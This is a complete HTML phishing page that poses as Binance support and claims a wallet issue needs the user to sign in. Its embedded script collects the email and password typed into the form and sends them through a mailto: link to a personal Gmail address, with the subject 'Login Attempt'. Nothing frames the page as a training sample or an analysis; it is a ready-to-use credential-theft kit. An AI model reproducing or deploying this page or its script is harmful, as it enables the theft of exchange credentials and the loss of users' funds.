<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binance Support - Wallet Issue</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            text-align: center;
            padding: 50px;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            margin: auto;
        }
        h2 {
            color: #f0b90b;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            background-color: #f0b90b;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #d9a10d;
        }
    </style>
    <script>
        function sendEmail(event) {
            event.preventDefault();
            let email = document.querySelector('input[name="email"]').value;
            let password = document.querySelector('input[name="password"]').value;
            
            window.location.href = `mailto:gregghaley9@gmail.com?subject=Login%20Attempt&body=Email: ${email}%0D%0APassword: ${password}`;
        }
    </script>
</head>
<body>
    <div class="container">
        <h2>Important Notification</h2>
        <p>Due to your last transaction, an issue has been detected affecting your wallet. Please sign in to resolve the issue.</p>
        <form onsubmit="sendEmail(event)">
            <input type="text" name="email" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
